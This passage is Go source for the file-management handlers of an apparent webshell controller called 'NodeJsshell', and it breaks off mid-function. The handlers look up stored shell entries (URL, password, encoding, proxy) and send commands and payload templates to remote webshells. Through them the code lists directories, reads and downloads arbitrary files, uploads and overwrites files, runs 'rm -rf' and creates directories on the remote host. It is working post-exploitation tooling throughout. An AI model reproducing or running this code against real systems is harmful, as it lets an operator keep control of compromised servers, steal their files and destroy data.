package handlers

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"NodeJsshell/internal/core/payload"
	"NodeJsshell/internal/core/proxy"
	"NodeJsshell/internal/core/transport"
	"NodeJsshell/internal/database"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

type FileHandler struct {
	db *database.DB
}

func NewFileHandler(db *database.DB) *FileHandler {
	return &FileHandler{db: db}
}

// cleanPath 彻底清理路径，移除所有转义字符
func cleanPath(path string) string {
	// 解码URL编码
	decoded, err := url.QueryUnescape(path)
	if err == nil {
		path = decoded
	}

	// 清理多余的空格
	path = strings.TrimSpace(path)

	// 如果是Unix路径（以/开头），将反斜杠转换为正斜杠，而不是移除
	if len(path) > 0 && path[0] == '/' {
		// 先处理转义的反斜杠+斜杠组合：\ / -> /
		path = strings.ReplaceAll(path, "\\/", "/")
		// 处理连续的反斜杠：\\ -> \
		for strings.Contains(path, "\\\\") {
			path = strings.ReplaceAll(path, "\\\\", "\\")
		}
		// 对于Unix路径，将剩余的反斜杠转换为正斜杠（而不是删除）
		// 这样可以避免 /etc\hostname 变成 /etchostname
		path = strings.ReplaceAll(path, "\\", "/")
		// 清理多余的正斜杠：// -> /
		for strings.Contains(path, "//") {
			path = strings.ReplaceAll(path, "//", "/")
		}
		return path
	}

	// 对于非Unix路径，循环清理转义字符
	for strings.Contains(path, "\\/") || strings.Contains(path, "\\\\") {
		path = strings.ReplaceAll(path, "\\/", "/")
		path = strings.ReplaceAll(path, "\\\\", "\\")
	}

	return path
}

func (h *FileHandler) List(c *gin.Context) {
	// 路由参数名是 :id，不是 :shellId
	shellId := c.Param("id")
	pathParam := c.Query("path")

	// 使用cleanPath函数彻底清理路径
	path := cleanPath(pathParam)

	fmt.Printf("[FileHandler.List] Shell ID参数: %s, Path原始: %s, Path清理后: %s\n", shellId, pathParam, path)
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		fmt.Printf("[FileHandler.List] ❌ Shell not found: ID=%s, Error=%v\n", shellId, err)
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	fmt.Printf("[FileHandler.List] 查询到Shell - ID: %d, ProxyID: %d\n", shell.ID, shell.ProxyID)
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		fmt.Printf("[FileHandler.List] Failed to create proxy client: %v\n", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	fmt.Printf("[FileHandler.List] HTTP客户端创建中...\n")
	var cmd string
	// 如果path为空或为"."，获取当前工作目录；否则切换到指定目录
	if path == "" || path == "." {
		cmd = "pwd && ls -la"
	} else {
		// path 已经通过 cleanPath 清理过了，确保它是干净的
		actualPath := strings.TrimSpace(path)
		// 如果路径不是以/开头，添加/
		if !strings.HasPrefix(actualPath, "/") {
			actualPath = "/" + strings.TrimPrefix(actualPath, "./")
		}
		// 最终确保路径中没有反斜杠（全部转换为正斜杠）
		actualPath = strings.ReplaceAll(actualPath, "\\", "/")
		// 清理多余的正斜杠
		for strings.Contains(actualPath, "//") {
			actualPath = strings.ReplaceAll(actualPath, "//", "/")
		}
		fmt.Printf("[FileHandler.List] 最终路径: [%s] (长度: %d)\n", actualPath, len(actualPath))
		// 使用strconv.Quote安全地引用路径，这会正确处理特殊字符（如空格）
		quotedPath := strconv.Quote(actualPath)
		cmd = fmt.Sprintf("cd %s && pwd && ls -la", quotedPath)
		fmt.Printf("[FileHandler.List] 生成命令: %s\n", cmd)
		fmt.Printf("[FileHandler.List] 引用的路径: %s\n", quotedPath)
	}
	var resp *transport.Response
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		customHeaders = h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		req := transport.BuildRequest(shell.Password, shell.EncodeType, "file", cmd)
		resp, err = httpClient.SendRequest(shell.URL, req)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if !resp.Success {
		errorMsg := resp.Error
		if errorMsg == "" {
			errorMsg = resp.Data
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell request failed: " + errorMsg})
		return
	}

	output := resp.Data
	output = strings.TrimSpace(output)
	if output == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Empty response from shell"})
		return
	}

	lines := strings.Split(output, "\n")
	var absolutePath string
	var files []gin.H

	for i, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		if i == 0 {
			absolutePath = line
			continue
		}

		parts := strings.Fields(line)
		if len(parts) < 9 {
			continue
		}

		if len(parts[0]) == 0 {
			continue
		}

		fileType := parts[0][0]
		fileName := parts[len(parts)-1]
		if fileName == "." || fileName == ".." {
			continue
		}

		fullPath := filepath.Join(absolutePath, fileName)
		files = append(files, gin.H{
			"name": fileName,
			"path": fullPath,
			"type": string(fileType),
			"size": parts[4],
			"mode": parts[0],
			"time": strings.Join(parts[5:8], " "),
		})
	}
	c.JSON(http.StatusOK, gin.H{
		"path":  absolutePath,
		"files": files,
	})
}

func (h *FileHandler) Read(c *gin.Context) {
	shellId := c.Param("id")
	filePathParam := c.Query("path")

	// 使用cleanPath函数彻底清理路径
	filePath := cleanPath(filePathParam)

	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "path is required"})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	// filePath 已经通过 cleanPath 清理过了，确保是干净的路径
	var absolutePath string
	absolutePath = filePath
	if !strings.HasPrefix(absolutePath, "/") {
		absolutePath = "/" + strings.TrimPrefix(absolutePath, "./")
	}
	// 最终确保路径中没有反斜杠（全部转换为正斜杠）
	absolutePath = strings.ReplaceAll(absolutePath, "\\", "/")
	// 清理多余的正斜杠
	for strings.Contains(absolutePath, "//") {
		absolutePath = strings.ReplaceAll(absolutePath, "//", "/")
	}
	fmt.Printf("[FileHandler.Read] Path原始: %q, Path清理后: %q, 最终路径: %q\n", filePathParam, filePath, absolutePath)

	templateCode, err := payload.GenerateFunctionTemplate("readFile", map[string]string{
		"FILE_PATH": strconv.Quote(absolutePath),
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate template: " + err.Error()})
		return
	}

	var resp *transport.Response
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		customHeaders = h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		req := transport.BuildRequest(shell.Password, shell.EncodeType, "file", templateCode)
		resp, err = httpClient.SendRequest(shell.URL, req)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if !resp.Success {
		errorMsg := resp.Error
		if errorMsg == "" {
			errorMsg = resp.Data
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell request failed: " + errorMsg})
		return
	}

	if resp.Data == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned empty response"})
		return
	}

	dataTrimmed := strings.TrimSpace(resp.Data)
	if !strings.HasPrefix(dataTrimmed, "{") && !strings.HasPrefix(dataTrimmed, "[") {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned invalid response: " + resp.Data})
		return
	}

	var fileReadResp struct {
		Ok      bool   `json:"ok"`
		Path    string `json:"path"`
		Content string `json:"content"`
		Size    int    `json:"size"`
		Error   string `json:"error"`
	}
	if err := json.Unmarshal([]byte(resp.Data), &fileReadResp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse shell response: " + err.Error() + ", Response data: " + resp.Data})
		return
	}
	if !fileReadResp.Ok {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + fileReadResp.Error})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"path":    fileReadResp.Path,
		"content": fileReadResp.Content,
	})
}

func (h *FileHandler) Upload(c *gin.Context) {
	shellId := c.Param("id")
	var req struct {
		RemotePath  string `json:"remote_path" binding:"required"`
		Content     string `json:"content" binding:"required"`
		ChunkIndex  *int   `json:"chunk_index"`
		TotalChunks *int   `json:"total_chunks"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	// 清理路径，确保没有转义字符
	filePath := cleanPath(req.RemotePath)
	var absolutePath string
	if strings.HasPrefix(filePath, "/") {
		absolutePath = filePath
	} else {
		absolutePath = "/" + strings.TrimPrefix(filePath, "./")
	}
	// 最终确保路径中没有反斜杠（全部转换为正斜杠）
	absolutePath = strings.ReplaceAll(absolutePath, "\\", "/")
	// 清理多余的正斜杠
	for strings.Contains(absolutePath, "//") {
		absolutePath = strings.ReplaceAll(absolutePath, "//", "/")
	}
	fmt.Printf("[FileHandler.Upload] Path原始: %q, Path清理后: %q, 最终路径: %q\n", req.RemotePath, filePath, absolutePath)

	// 检查是否使用分片上传（如果提供了 chunk_index 和 total_chunks），允许单片写入
	useChunked := req.ChunkIndex != nil && req.TotalChunks != nil && *req.TotalChunks >= 1

	var templateCode string
	if useChunked {
		// 分片上传：直接将 content 作为 Base64 发送
		chunkIndex := *req.ChunkIndex
		totalChunks := *req.TotalChunks
		contentLen := len(req.Content)
		fmt.Printf("[FileHandler.Upload] 分片上传: chunk %d/%d, content_len=%d, path=%s\n", chunkIndex+1, totalChunks, contentLen, absolutePath)

		// 检查分片数据是否太大（Base64编码后可能超过限制）
		if contentLen > 500000 {
			fmt.Printf("[FileHandler.Upload] ⚠️  警告: 分片数据较大 (%d bytes)，可能影响传输\n", contentLen)
		}

		// 使用极简模板，减少代码体积
		// CHUNK_DATA 需要 Quote 以作为字符串字面量
		templateCode, err = payload.GenerateFunctionTemplate("uploadFileChunk", map[string]string{
			"FILE_PATH":    strconv.Quote(absolutePath),
			"CHUNK_INDEX":  strconv.Itoa(chunkIndex),
			"CHUNK_DATA":   strconv.Quote(req.Content), // Base64 编码的数据作为字符串
			"TOTAL_CHUNKS": strconv.Itoa(totalChunks),
		})
		if err != nil {
			fmt.Printf("[FileHandler.Upload] ❌ 生成模板代码失败: %v\n", err)
		} else {
			templateLen := len(templateCode)
			fmt.Printf("[FileHandler.Upload] 模板代码生成成功，长度=%d bytes (数据部分约 %d bytes)\n", templateLen, contentLen)
		}
	} else {
		// 非分片上传：兼容原有方式
		contentBase64 := base64.StdEncoding.EncodeToString([]byte(req.Content))
		templateCode, err = payload.GenerateFunctionTemplate("uploadFile", map[string]string{
			"FILE_PATH":    strconv.Quote(absolutePath),
			"FILE_CONTENT": strconv.Quote(contentBase64),
		})
	}

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate template: " + err.Error()})
		return
	}
	var resp *transport.Response
	fmt.Printf("[FileHandler.Upload] 准备发送请求: Protocol=%s, Method=%s, URL=%s, TemplateCode长度=%d\n",
		shell.Protocol, shell.Method, shell.URL, len(templateCode))
	if shell.Protocol == "multipart" {
		customHeaders := h.getCustomHeaders(&shell)
		fmt.Printf("[FileHandler.Upload] 使用 multipart 协议发送\n")
		if shell.Method == "GET" {
			fmt.Printf("[FileHandler.Upload] 使用 GET 方法\n")
			resp, err = httpClient.SendGetRequest(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders)
		} else {
			fmt.Printf("[FileHandler.Upload] 使用 POST 方法 (multipart)\n")
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		fmt.Printf("[FileHandler.Upload] 使用标准 JSON 协议发送\n")
		transportReq := transport.BuildRequest(shell.Password, shell.EncodeType, "file", templateCode)
		resp, err = httpClient.SendRequest(shell.URL, transportReq)
	}
	if err != nil {
		fmt.Printf("[FileHandler.Upload] ❌ http send error: %v (错误类型: %T)\n", err, err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if !resp.Success {
		errorMsg := resp.Error
		if errorMsg == "" {
			errorMsg = resp.Data
		}
		fmt.Printf("[FileHandler.Upload] shell response not success, error=%s, data=%s\n", resp.Error, resp.Data)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell request failed: " + errorMsg})
		return
	}

	if resp.Data == "" {
		fmt.Printf("[FileHandler.Upload] shell returned empty data\n")
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned empty response"})
		return
	}

	dataTrimmed := strings.TrimSpace(resp.Data)
	if !strings.HasPrefix(dataTrimmed, "{") && !strings.HasPrefix(dataTrimmed, "[") {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned invalid response: " + resp.Data})
		return
	}

	// 检查是否是分片上传响应
	if useChunked {
		var chunkUploadResp struct {
			Ok          bool   `json:"ok"`
			Path        string `json:"path"`
			ChunkIndex  int    `json:"chunkIndex"`
			TotalChunks int    `json:"totalChunks"`
			Size        int    `json:"size"`
			Message     string `json:"message"`
			Error       string `json:"error"`
		}
		if err := json.Unmarshal([]byte(resp.Data), &chunkUploadResp); err != nil {
			fmt.Printf("[FileHandler.Upload] 分片响应解析失败: %v, 响应数据: %s\n", err, resp.Data)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse chunk upload response: " + err.Error() + ", Response data: " + resp.Data})
			return
		}
		if !chunkUploadResp.Ok {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + chunkUploadResp.Error})
			return
		}
		// 返回分片上传响应，包含进度信息
		c.JSON(http.StatusOK, gin.H{
			"success":      true,
			"chunk_index":  chunkUploadResp.ChunkIndex,
			"total_chunks": chunkUploadResp.TotalChunks,
			"message":      chunkUploadResp.Message,
		})
	} else {
		// 非分片上传响应（兼容原有方式）
		var fileUploadResp struct {
			Ok    bool   `json:"ok"`
			Path  string `json:"path"`
			Size  int    `json:"size"`
			Error string `json:"error"`
		}
		if err := json.Unmarshal([]byte(resp.Data), &fileUploadResp); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse shell response: " + err.Error() + ", Response data: " + resp.Data})
			return
		}
		if !fileUploadResp.Ok {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + fileUploadResp.Error})
			return
		}
		c.JSON(http.StatusOK, resp)
	}
}

func (h *FileHandler) Download(c *gin.Context) {
	shellId := c.Param("id")
	filePathParam := c.Query("path")

	// 使用cleanPath函数彻底清理路径
	filePath := cleanPath(filePathParam)

	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "path is required"})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	// filePath 已经通过 cleanPath 清理过了，确保是干净的路径
	var absolutePath string
	absolutePath = filePath
	if !strings.HasPrefix(absolutePath, "/") {
		absolutePath = "/" + strings.TrimPrefix(absolutePath, "./")
	}
	// 最终确保路径中没有反斜杠（全部转换为正斜杠）
	absolutePath = strings.ReplaceAll(absolutePath, "\\", "/")
	// 清理多余的正斜杠
	for strings.Contains(absolutePath, "//") {
		absolutePath = strings.ReplaceAll(absolutePath, "//", "/")
	}
	fmt.Printf("[FileHandler.Download] Path原始: %q, Path清理后: %q, 最终路径: %q\n", filePathParam, filePath, absolutePath)

	// 检查是否使用分片下载
	chunkIndexStr := c.Query("chunk_index")
	chunkSizeStr := c.Query("chunk_size")
	var templateCode string
	var useChunkedDownload bool
	if chunkIndexStr != "" && chunkSizeStr != "" {
		chunkIndex, err1 := strconv.Atoi(chunkIndexStr)
		chunkSize, err2 := strconv.Atoi(chunkSizeStr)
		if err1 == nil && err2 == nil && chunkIndex >= 0 && chunkSize > 0 {
			// 分片下载
			fmt.Printf("[FileHandler.Download] 分片下载: chunk %d, size %d\n", chunkIndex, chunkSize)
			useChunkedDownload = true
			templateCode, err = payload.GenerateFunctionTemplate("downloadFileChunk", map[string]string{
				"FILE_PATH":   strconv.Quote(absolutePath),
				"CHUNK_INDEX": strconv.Itoa(chunkIndex),
				"CHUNK_SIZE":  strconv.Itoa(chunkSize),
			})
		} else {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid chunk_index or chunk_size"})
			return
		}
	} else {
		// 非分片下载：兼容原有方式
		templateCode, err = payload.GenerateFunctionTemplate("downloadFile", map[string]string{
			"FILE_PATH": strconv.Quote(absolutePath),
		})
	}

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate template: " + err.Error()})
		return
	}
	var resp *transport.Response
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		customHeaders = h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		req := transport.BuildRequest(shell.Password, shell.EncodeType, "file", templateCode)
		resp, err = httpClient.SendRequest(shell.URL, req)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if !resp.Success {
		errorMsg := resp.Error
		if errorMsg == "" {
			errorMsg = resp.Data
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell request failed: " + errorMsg})
		return
	}

	if resp.Data == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned empty response"})
		return
	}

	dataTrimmed := strings.TrimSpace(resp.Data)
	if !strings.HasPrefix(dataTrimmed, "{") && !strings.HasPrefix(dataTrimmed, "[") {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned invalid response: " + resp.Data})
		return
	}

	if useChunkedDownload {
		// 分片下载返回 JSON，字段兼容 camelCase 与 snake_case
		var chunkResp struct {
			Ok           bool   `json:"ok"`
			Path         string `json:"path"`
			ChunkIndex   int    `json:"chunkIndex"`
			TotalChunks  int    `json:"totalChunks"`
			ChunkSize    int    `json:"chunkSize"`
			FileSize     int    `json:"fileSize"`
			Base64       string `json:"base64"`
			ChunkIndex2  int    `json:"chunk_index"`
			TotalChunks2 int    `json:"total_chunks"`
			ChunkSize2   int    `json:"chunk_size"`
			FileSize2    int    `json:"file_size"`
			Data         string `json:"data"`
			Error        string `json:"error"`
		}
		if err := json.Unmarshal([]byte(resp.Data), &chunkResp); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse chunk download response: " + err.Error() + ", Response data: " + resp.Data})
			return
		}
		if !chunkResp.Ok {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + chunkResp.Error})
			return
		}
		// 兼容字段
		chunkIndex := chunkResp.ChunkIndex
		if chunkIndex == 0 && chunkResp.ChunkIndex2 != 0 {
			chunkIndex = chunkResp.ChunkIndex2
		}
		totalChunks := chunkResp.TotalChunks
		if totalChunks == 0 && chunkResp.TotalChunks2 != 0 {
			totalChunks = chunkResp.TotalChunks2
		}
		chunkSize := chunkResp.ChunkSize
		if chunkSize == 0 && chunkResp.ChunkSize2 != 0 {
			chunkSize = chunkResp.ChunkSize2
		}
		fileSize := chunkResp.FileSize
		if fileSize == 0 && chunkResp.FileSize2 != 0 {
			fileSize = chunkResp.FileSize2
		}
		data := chunkResp.Base64
		if data == "" && chunkResp.Data != "" {
			data = chunkResp.Data
		}
		c.JSON(http.StatusOK, gin.H{
			"ok":           true,
			"path":         chunkResp.Path,
			"chunk_index":  chunkIndex,
			"total_chunks": totalChunks,
			"chunk_size":   chunkSize,
			"file_size":    fileSize,
			"data":         data,
		})
		return
	}

	var fileDownloadResp struct {
		Ok     bool   `json:"ok"`
		Path   string `json:"path"`
		Base64 string `json:"base64"`
		Size   int    `json:"size"`
		Error  string `json:"error"`
	}
	if err := json.Unmarshal([]byte(resp.Data), &fileDownloadResp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse shell response: " + err.Error() + ", Response data: " + resp.Data})
		return
	}
	if !fileDownloadResp.Ok {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + fileDownloadResp.Error})
		return
	}
	fileContent, err := base64.StdEncoding.DecodeString(fileDownloadResp.Base64)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to decode base64 content: " + err.Error()})
		return
	}
	fileName := filepath.Base(absolutePath)
	c.Header("Content-Disposition", "attachment; filename="+fileName)
	c.Data(http.StatusOK, "application/octet-stream", fileContent)
}

func (h *FileHandler) Update(c *gin.Context) {
	shellId := c.Param("id")
	var req struct {
		Path    string `json:"path" binding:"required"`
		Content string `json:"content" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	// 清理路径，确保没有转义字符
	filePath := cleanPath(req.Path)
	var absolutePath string
	if strings.HasPrefix(filePath, "/") {
		absolutePath = filePath
	} else {
		absolutePath = "/" + strings.TrimPrefix(filePath, "./")
	}
	// 最终确保路径中没有反斜杠（全部转换为正斜杠）
	absolutePath = strings.ReplaceAll(absolutePath, "\\", "/")
	// 清理多余的正斜杠
	for strings.Contains(absolutePath, "//") {
		absolutePath = strings.ReplaceAll(absolutePath, "//", "/")
	}
	fmt.Printf("[FileHandler.Update] Path原始: %q, Path清理后: %q, 最终路径: %q\n", req.Path, filePath, absolutePath)

	contentBase64 := base64.StdEncoding.EncodeToString([]byte(req.Content))
	templateCode, err := payload.GenerateFunctionTemplate("uploadFile", map[string]string{
		"FILE_PATH":    strconv.Quote(absolutePath),
		"FILE_CONTENT": strconv.Quote(contentBase64),
	})
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate template: " + err.Error()})
		return
	}
	var resp *transport.Response
	if shell.Protocol == "multipart" {
		customHeaders := h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, templateCode, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		transportReq := transport.BuildRequest(shell.Password, shell.EncodeType, "file", templateCode)
		resp, err = httpClient.SendRequest(shell.URL, transportReq)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	if !resp.Success {
		errorMsg := resp.Error
		if errorMsg == "" {
			errorMsg = resp.Data
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell request failed: " + errorMsg})
		return
	}

	if resp.Data == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned empty response"})
		return
	}

	dataTrimmed := strings.TrimSpace(resp.Data)
	if !strings.HasPrefix(dataTrimmed, "{") && !strings.HasPrefix(dataTrimmed, "[") {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned invalid response: " + resp.Data})
		return
	}

	var fileUpdateResp struct {
		Ok    bool   `json:"ok"`
		Path  string `json:"path"`
		Size  int    `json:"size"`
		Error string `json:"error"`
	}
	if err := json.Unmarshal([]byte(resp.Data), &fileUpdateResp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to parse shell response: " + err.Error() + ", Response data: " + resp.Data})
		return
	}
	if !fileUpdateResp.Ok {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Shell returned error: " + fileUpdateResp.Error})
		return
	}
	c.JSON(http.StatusOK, resp)
}

func (h *FileHandler) Delete(c *gin.Context) {
	shellId := c.Param("id")
	filePathParam := c.Query("path")

	// 使用cleanPath函数彻底清理路径
	filePath := cleanPath(filePathParam)

	if filePath == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "path is required"})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	var absolutePath string
	absolutePath = filePath
	if !strings.HasPrefix(absolutePath, "/") {
		absolutePath = "/" + strings.TrimPrefix(absolutePath, "./")
	}
	cmd := fmt.Sprintf("rm -rf %s", strconv.Quote(absolutePath))
	var resp *transport.Response
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		customHeaders = h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		req := transport.BuildRequest(shell.Password, shell.EncodeType, "file", cmd)
		resp, err = httpClient.SendRequest(shell.URL, req)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, resp)
}

func (h *FileHandler) Mkdir(c *gin.Context) {
	shellId := c.Param("id")
	var req struct {
		Path string `json:"path" binding:"required"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var shell database.Shell
	if err := h.db.First(&shell, shellId).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Shell not found"})
		return
	}
	httpClient, err := h.createHTTPClientWithProxy(shell.ProxyID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to create proxy client: " + err.Error()})
		return
	}
	// 清理路径，确保没有转义字符
	filePath := cleanPath(req.Path)
	var absolutePath string
	if strings.HasPrefix(filePath, "/") {
		absolutePath = filePath
	} else {
		absolutePath = "/" + strings.TrimPrefix(filePath, "./")
	}
	// 最终确保路径中没有反斜杠（全部转换为正斜杠）
	absolutePath = strings.ReplaceAll(absolutePath, "\\", "/")
	// 清理多余的正斜杠
	for strings.Contains(absolutePath, "//") {
		absolutePath = strings.ReplaceAll(absolutePath, "//", "/")
	}
	fmt.Printf("[FileHandler.Mkdir] 最终路径: %s\n", absolutePath)

	cmd := fmt.Sprintf("mkdir -p %s", strconv.Quote(absolutePath))
	var resp *transport.Response
	var customHeaders map[string]string
	if shell.CustomHeaders != "" {
		json.Unmarshal([]byte(shell.CustomHeaders), &customHeaders)
	}
	if customHeaders == nil {
		customHeaders = make(map[string]string)
	}
	if shell.Protocol == "multipart" {
		customHeaders = h.getCustomHeaders(&shell)
		if shell.Method == "GET" {
			resp, err = httpClient.SendGetRequest(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders)
		} else {
			resp, err = httpClient.SendMultipartRequestWithProtocol(shell.URL, cmd, shell.Password, shell.EncodeType, customHeaders, shell.Protocol)
		}
	} else {
		req := transport.BuildRequest(shell.Password, shell.EncodeType, "file", cmd)
		resp, err = httpClient.SendRequest(shell.URL, req)
	}
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, resp)
}

func (h *FileHandler) createHTTPClientWithProxy(proxyID uint) (*transport.HTTPClient, error) {
	fmt.Printf("[FileHandler.createHTTPClientWithProxy] 调用 - ProxyID: %d\n", proxyID)
	if proxyID > 0 {
		var proxyConfig database.Proxy
